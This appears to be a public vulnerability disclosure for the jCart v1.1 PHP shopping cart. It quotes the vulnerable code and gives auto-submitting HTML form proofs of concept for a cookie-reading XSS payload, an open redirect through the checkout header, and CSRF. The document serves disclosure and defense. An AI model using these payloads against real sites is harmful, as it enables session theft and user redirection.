@@ -1,0 +1,68 @@
+<!-- 
+     Exploit Title: jCart v1.1 Multiple XSS/CSRF/Open Redirect Vulnerabilities
+     Date: 25.07.2010
+     Author: p0deje
+     Software Link: http://conceptlogic.com/jcart/
+     Version: <=1.1
+     Tested on: OS Independent
+     CVE : --
+-->
+
+<!-- 1. Cross-site Scripting -->
+
+<!--  
+      Vulnerable code snippet:
+      jcart.php
+      -------------------------
+      line 251:        $item_name = $_POST[$item_name];
+      ...
+      line 256:        $item_added = $this->add_item($item_id, $item_qty, $item_price, $item_name);
+      -------------------------
+
+      User-supplied input for variable $item_name isn't properly escaped.
+
+      Proof-of-Concept:
+-->
+      <html>
+        <form action="http://evil.host/jcart-1.1/jcart/jcart-relay.php" method="POST">
+          <input name="my-item-id" value="3" type="hidden">
+          <input name="my-item-qty" value="1" type="hidden">
+          <input name="my-item-name" value="<script>alert(document.cookie)</script>" type="hidden">
+          <input name="my-item-price" value="33.25" type="hidden">
+          <input id="payload" name="my-add-button" value="add to cart" class="button" type="submit">
+          </form>
+          <script>
+            document.getElementById('payload').click()
+        </script>
+      </html>
+
+<!--  2. Cross-site Scripting / Open Redirect -->
+
+<!--
+      Vulnerable code snippet 
+      jcart-gateway.php:
+      -------------------------
+      line 41:    header('Location: ' . $_POST['jcart_checkout_page']);
+      -------------------------
+
+      User-supplied data is not properly escaped before passing to header() function.
+
+      Proof-of-Concept:
+-->
+      <html>
+        <form action="http://evil.host/jcart-1.1/jcart/jcart-gateway.php" method="POST">
+          <input name="jcart_checkout_page" value="http://www.google.com" type="hidden">
+          <input id="payload" name="my-add-button" value="add to cart" class="button" type="submit">
+          </form>
+          <script>
+            document.getElementById('payload').click()
+        </script>
+      </html>
+
+<!--  3. Cross-site Request Forgery -->
+
+<!--
+      All requests of jCart are vulnerable to CSRF.
+      Proof-of-Concept goes the same as for the first or the second vulnerability.
+-->
+
